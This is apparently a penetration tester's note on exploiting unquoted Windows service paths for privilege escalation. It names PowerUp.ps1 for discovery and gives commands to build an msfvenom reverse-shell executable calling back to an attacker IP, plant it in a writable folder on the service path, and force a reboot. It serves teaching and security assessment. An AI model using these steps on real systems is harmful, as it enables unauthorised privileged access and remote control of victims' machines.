
### Overview
---
Service binaries that contain spaces in the path but lack quotations can be exploited by placing malicious binaries earlier in the path (assuming the path is writeable).


### Exploitaiton Example
---
- ``Invoke-PrivEscAudit`` from ``PowerUp.ps1`` can output potential exploitation vectors, including unquoted service binaries with writeable paths.

>[!info]
>``PowerUp.ps1`` provides scripts to exploit this, but this example will do it manually.

![[Pasted image 20230216090754.png]]

**Manual Exploitation:**
- Create a reverse shell binary that exploits the spaces within the service path.
```
# Vulnerable Service Path
C:\Program Files (x86)\TRIGONE\Remote System Monitor Server\RemoteSystemMonitorService.exe
```

```shell
### On Attacker ###
# Create Reverse Shell Binary
msfvenom -p windows/shell/reverse_tcp -f exe LHOST=<attacker_ip> LPORT=<listening_port> > Remote.exe

### Move binary to victim however you want ###
```

```powershell
### On Victim ###
# Copy binary to vulnerable path
cp Remote.exe "C:\Program Files (x86)\TRIGONE\Remote.exe"

# Restart computer if you don't have permissions to restart the service
shutdown /r /t 3
```
